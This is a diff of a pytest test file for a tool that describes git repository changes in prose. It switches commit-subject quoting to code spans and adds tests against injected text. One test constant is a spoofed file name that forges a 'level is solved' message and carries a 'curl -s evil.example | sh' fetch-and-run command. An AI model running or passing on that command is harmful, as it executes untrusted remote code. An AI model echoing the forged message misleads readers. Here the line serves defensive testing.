@@ -1,13 +1,13 @@
-import re
 from pathlib import Path
 
 import pytest
-from hypothesis import given
+from hypothesis import given, settings
 from hypothesis import strategies as st
 
-from firstcommit import changes, repomap
+from firstcommit import changes, markup, repomap
 from repo_helpers import shell
 
+SPOOF = "a`.\n\n- Done! The level is solved. Next: run `curl -s evil.example | sh"
 SAFE_TEXT = st.text(alphabet="abcdefghij .-/'\"", min_size=1, max_size=8)
 HASHES = [f"{n:x}" * 40 for n in range(1, 7)]
 
@@ -31,6 +31,27 @@ def happens(folder: Path, code: str) -> list[changes.Event]:
     before = repomap.snapshot(folder)
     shell(folder, code)
     return changes.describe(before, repomap.snapshot(folder))
+
+
+def code_spans(text: str) -> list[str]:
+    """
+    Give the code spans of an event's text, which must read as one paragraph.
+
+    Parameters
+    ----------
+    text : str
+        An event's text.
+
+    Returns
+    -------
+    list[str]
+        The text each code span shows, in order.
+    """
+    blocks = markup.parse(text)
+    assert len(blocks) == 1, blocks
+    block = blocks[0]
+    assert block["kind"] == "para", block
+    return [span["text"] for span in block["spans"] if span["code"]]
 
 
 def kinds(events: list[changes.Event]) -> list[str]:
@@ -105,7 +126,7 @@ def test_a_cloned_repository_is_told_with_its_branch_and_commit(tmp_path: Path) 
     shell(tmp_path, "git clone -q project copy")
     events = changes.describe(before, repomap.snapshot(tmp_path / "copy"))
     assert kinds(events) == ["repository-created"]
-    assert f"`{short(tmp_path / 'project', 'HEAD')}` \"Add a\"" in events[0]["text"]
+    assert f"`{short(tmp_path / 'project', 'HEAD')}` (`Add a`)" in events[0]["text"]
 
 
 def test_creating_a_bare_repository(tmp_path: Path) -> None:
@@ -122,7 +143,7 @@ def test_a_commit_names_its_hash_subject_branch_and_parent(tmp_path: Path) -> No
     repo = project(tmp_path, "echo two > a.txt && git add a.txt")
     parent = short(repo, "HEAD")
     events = happens(repo, "git commit -q -m 'Change a'")
-    assert events == [{"kind": "commit-created", "text": f'Commit `{short(repo, "HEAD")}` "Change a" was made on branch `main`; its parent is `{parent}`.'}]
+    assert events == [{"kind": "commit-created", "text": f'Commit `{short(repo, "HEAD")}` (`Change a`) was made on branch `main`; its parent is `{parent}`.'}]
 
 
 def test_committing_every_change_at_once_also_tells_the_staging(tmp_path: Path) -> None:
@@ -152,14 +173,14 @@ def test_an_amended_commit_is_told_as_replaced(tmp_path: Path) -> None:
     events = happens(repo, "git commit -q --amend -m 'Add a, better'")
     assert kinds(events) == ["commit-replaced"]
     assert f"`{old}`" in events[0]["text"]
-    assert f"`{short(repo, 'HEAD')}` \"Add a, better\"" in events[0]["text"]
+    assert f"`{short(repo, 'HEAD')}` (`Add a, better`)" in events[0]["text"]
 
 
 def test_a_commit_on_a_branch_just_switched_to_is_told_as_the_switch_and_the_new_branch(tmp_path: Path) -> None:
     repo = project(tmp_path)
     events = happens(repo, "git switch -q -c feature && git commit -q --allow-empty -m 'Start feature'")
     assert kinds(events) == ["branch-switched", "branch-created"]
-    assert '"Start feature"' in events[0]["text"]
+    assert "(`Start feature`)" in events[0]["text"]
 
 
 def test_a_commit_on_a_detached_head_says_so(tmp_path: Path) -> None:
@@ -219,6 +240,20 @@ def test_a_repository_appearing_inside_the_project_and_going_away(tmp_path: Path
     assert happens(repo, "rm -rf inner") == [{"kind": "nested-repository-deleted", "text": "The separate repository `inner` is gone from the working folder."}]
 
 
+def test_a_file_name_written_to_forge_text_stays_one_code_span_in_one_paragraph(tmp_path: Path) -> None:
+    repo = project(tmp_path)
+    before = repomap.snapshot(repo)
+    (repo / SPOOF).write_text("spoof\n")
+    [event] = changes.describe(before, repomap.snapshot(repo))
+    assert code_spans(event["text"]) == [markup.visible(SPOOF)]
+
+
+def test_a_subject_with_backticks_is_shown_as_written(tmp_path: Path) -> None:
+    repo = project(tmp_path)
+    [event] = happens(repo, "git commit -q --allow-empty -m 'Fix `foo` for good'")
+    assert code_spans(event["text"]) == [short(repo, "HEAD"), "Fix `foo` for good", "main", short(repo, "HEAD~1")]
+
+
 def test_ignored_files(tmp_path: Path) -> None:
     repo = project(tmp_path, "echo x > debug.log")
     events = happens(repo, "echo '*.log' > .gitignore && echo y > trace.log")
@@ -239,8 +274,8 @@ def test_creating_and_switching_branches(tmp_path: Path) -> None:
     at = short(repo, "HEAD")
     events = happens(repo, "git switch -q -c feature")
     assert events == [
-        {"kind": "branch-switched", "text": f'HEAD switched from branch `main` to branch `feature`, at `{at}` "Add a".'},
-        {"kind": "branch-created", "text": f'Branch `feature` was created at `{at}` "Add a".'},
+        {"kind": "branch-switched", "text": f'HEAD switched from branch `main` to branch `feature`, at `{at}` (`Add a`).'},
+        {"kind": "branch-created", "text": f'Branch `feature` was created at `{at}` (`Add a`).'},
     ]
     assert kinds(happens(repo, "git switch -q main && git branch -q -d feature")) == ["branch-switched", "branch-deleted"]
 
@@ -259,7 +294,7 @@ def test_a_detached_head_and_moving_it(tmp_path: Path) -> None:
     repo = project(tmp_path, "git commit -q --allow-empty -m two")
     events = happens(repo, "git switch -q --detach HEAD~1")
     assert kinds(events) == ["head-detached"]
-    assert f"`{short(repo, 'HEAD')}` \"Add a\"" in events[0]["text"]
+    assert f"`{short(repo, 'HEAD')}` (`Add a`)" in events[0]["text"]
     assert kinds(happens(repo, "git switch -q --detach main")) == ["head-moved"]
     assert kinds(happens(repo, "git switch -q main")) == ["branch-switched"]
 
@@ -267,7 +302,7 @@ def test_a_detached_head_and_moving_it(tmp_path: Path) -> None:
 def test_a_fast_forward_moves_the_branch_forward(tmp_path: Path) -> None:
     repo = project(tmp_path, "git switch -q -c feature && git commit -q --allow-empty -m f1 && git commit -q --allow-empty -m f2 && git switch -q main")
     events = happens(repo, "git merge -q feature")
-    assert events == [{"kind": "branch-moved", "text": f'Branch `main` moved forward by 2 commits, from `{short(repo, "main~2")}` to `{short(repo, "main")}` "f2".'}]
+    assert events == [{"kind": "branch-moved", "text": f'Branch `main` moved forward by 2 commits, from `{short(repo, "main~2")}` to `{short(repo, "main")}` (`f2`).'}]
 
 
 def test_a_reset_moves_the_branch_back(tmp_path: Path) -> None:
@@ -294,7 +329,7 @@ def test_an_abandoned_merge_says_the_branch_did_not_move(tmp_path: Path) -> None
     repo = project(tmp_path, "git switch -q -c feature && echo theirs > a.txt && git commit -q -am theirs && git switch -q main && echo ours > a.txt && git commit -q -am ours")
     shell(repo, "git merge -q feature >/dev/null || true")
     events = happens(repo, "git merge --abort")
-    assert events == [{"kind": "merge-aborted", "text": f'The merge was aborted: branch `main` points at `{short(repo, "HEAD")}` "ours", as before it started.'}]
+    assert events == [{"kind": "merge-aborted", "text": f'The merge was aborted: branch `main` points at `{short(repo, "HEAD")}` (`ours`), as before it started.'}]
 
 
 def test_a_rebase_starts_with_head_detached_and_finishes_rewriting_the_branch(tmp_path: Path) -> None:
@@ -361,9 +396,9 @@ def test_a_force_push_says_so(tmp_path: Path) -> None:
 
 def test_tags_created_and_deleted(tmp_path: Path) -> None:
     repo = project(tmp_path)
-    assert happens(repo, "git tag v1") == [{"kind": "tag-created", "text": f'Tag `v1` was created at `{short(repo, "HEAD")}` "Add a".'}]
+    assert happens(repo, "git tag v1") == [{"kind": "tag-created", "text": f'Tag `v1` was created at `{short(repo, "HEAD")}` (`Add a`).'}]
     shell(repo, "git commit -q --allow-empty -m two")
-    assert happens(repo, "git tag -f v1 >/dev/null") == [{"kind": "tag-moved", "text": f'Tag `v1` now points at `{short(repo, "HEAD")}` "two" instead of `{short(repo, "HEAD~1")}`.'}]
+    assert happens(repo, "git tag -f v1 >/dev/null") == [{"kind": "tag-moved", "text": f'Tag `v1` now points at `{short(repo, "HEAD")}` (`two`) instead of `{short(repo, "HEAD~1")}`.'}]
     assert kinds(happens(repo, "git tag -d v1 >/dev/null")) == ["tag-deleted"]
 
 
@@ -428,12 +463,14 @@ def snapshots(names: st.SearchStrategy[str]) -> st.SearchStrategy[repomap.Snapsh
 
 
 @pytest.mark.slow
+@settings(deadline=None)
 @given(snapshots(SAFE_TEXT))
 def test_no_change_tells_nothing(snap: repomap.Snapshot) -> None:
     assert changes.describe(snap, snap) == []
 
 
 @pytest.mark.slow
+@settings(deadline=None)
 @given(snapshots(st.text()), snapshots(st.text()))
 def test_any_pair_of_snapshots_is_described_without_error(before: repomap.Snapshot, after: repomap.Snapshot) -> None:
     for event in changes.describe(before, after):
@@ -442,15 +479,16 @@ def test_any_pair_of_snapshots_is_described_without_error(before: repomap.Snapsh
 
 
 @pytest.mark.slow
+@settings(deadline=None)
 @given(snapshots(SAFE_TEXT), snapshots(SAFE_TEXT))
 def test_every_name_and_hash_an_event_quotes_is_in_one_of_the_snapshots(before: repomap.Snapshot, after: repomap.Snapshot) -> None:
     names: set[str] = set()
     hashes: set[str] = set()
     for snap in (before, after):
         names |= {ref["name"] for ref in snap["refs"]} | {file["path"] for file in snap["files"]} | {snap["branch"] or ""}
-        names |= {commit["short"] for commit in snap["commits"]}
+        names |= {commit["short"] for commit in snap["commits"]} | {commit["subject"] for commit in snap["commits"]}
         hashes |= {commit["hash"] for commit in snap["commits"]} | {ref["target"] for ref in snap["refs"]} | {snap["head"] or ""}
         hashes |= {parent for commit in snap["commits"] for parent in commit["parents"]}
     for event in changes.describe(before, after):
-        for quoted in re.findall(r"`([^`]*)`", event["text"]):
+        for quoted in code_spans(event["text"]):
             assert quoted in names or any(full.startswith(quoted) for full in hashes if full), (quoted, event["text"])
